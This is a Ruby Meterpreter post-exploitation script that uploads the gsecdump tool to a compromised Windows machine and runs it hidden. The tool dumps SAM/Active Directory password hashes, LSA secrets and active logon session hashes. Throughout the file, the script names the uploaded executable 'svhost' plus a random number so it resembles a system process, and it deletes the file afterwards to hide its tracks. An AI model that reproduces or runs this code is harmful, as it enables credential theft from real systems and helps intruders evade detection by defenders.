# secdump.rb deanx

session = client
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-p" => [ false,"Path on target to upload executable, default is %TEMP%." ],
	"-a" => [ false,"Dump all creds" ],
	"-s" => [ false,"Dump hashes from SAM/AD" ],
	"-l" => [ false,"Dump LSA Secrets" ],
	"-u" => [ false,"Dump Active logon session hashes" ],
	"-w" => [ false,"Dump Wireless Creds {NOT IMPLEMENTED}" ]

)

################## function declaration Declarations ##################
def usage()
	print_line "UploadExec gsecdump"
	print_line(@@exec_opts.usage)
	raise Rex::Script::Completed
end

def upload(session,file,trgloc = "")
	if not ::File.exists?(file)
		raise "File to Upload does not exists!"
	else
		if trgloc == ""
		location = session.fs.file.expand_path("%TEMP%")
		else
			location = trgloc
		end
		begin
			ext = file[file.rindex(".") .. -1]
			if ext and ext.downcase == ".exe"
				fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
			else
				fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
			end
			print_status("\tUploading #{file}....")
			session.fs.file.upload_file("#{fileontrgt}","#{file}")
			print_status("\t#{file} uploaded!")
			print_status("\tUploaded as #{fileontrgt}")
		rescue ::Exception => e
			print_status("Error uploading file #{file}: #{e.class} #{e}")
			raise e
		end
	end
	return fileontrgt
end

#Function for executing a list of commands
def cmd_on_trgt_exec(session,cmdexe,opt,verbose)
	r=''
	session.response_timeout=120
	if verbose == 1
		begin
			print_status "\tRunning command #{cmdexe}"
			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)
				print_status("\t#{d}")
			end
			r.channel.close
			r.close
		rescue ::Exception => e
			print_status("Error Running Command #{cmdexe}: #{e.class} #{e}")
			raise e
		end
	else
		begin
			print_status "\trunning command #{cmdexe}"
			r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
			r.close
		rescue ::Exception => e
			print_status("Error Running Command #{cmdexe}: #{e.class} #{e}")
			raise e
		end
	end
end

def m_unlink(session, path)
	r = session.sys.process.execute("cmd.exe /c del /F /S /Q " + path, nil, {'Hidden' => 'true'})
	while(r.name)
		select(nil, nil, nil, 0.10)
	end
	r.close
end
#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
unsupported if client.platform !~ /win32|win64/i
#parsing of Options
file = "~/windows_tools/gsecdump-v2b5.exe"
cmdopt = "-" 
helpcall = 0
path = ""
verbose = 1
remove = 1	
@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-p"
		path = val
	when "-h"
		helpcall = 1
	when "-a"
		cmdopt += "a"
	when "-s"
		cmdopt += "s"
	when "-l"
		cmdopt += "l"
	when "-u"
		cmdopt += "u"
	when "-w"
		cmdopt += "w"
	end

}

if args.length == 0 || helpcall == 1
	usage
end
#print_status("Running Upload and Execute Meterpreter script....")
exec = upload(session,file,path)
cmd_on_trgt_exec(session,exec,cmdopt,verbose)
if remove == 1
	print_status("\tDeleting #{exec}")
	m_unlink(session, exec)
end
print_status("Finished!")
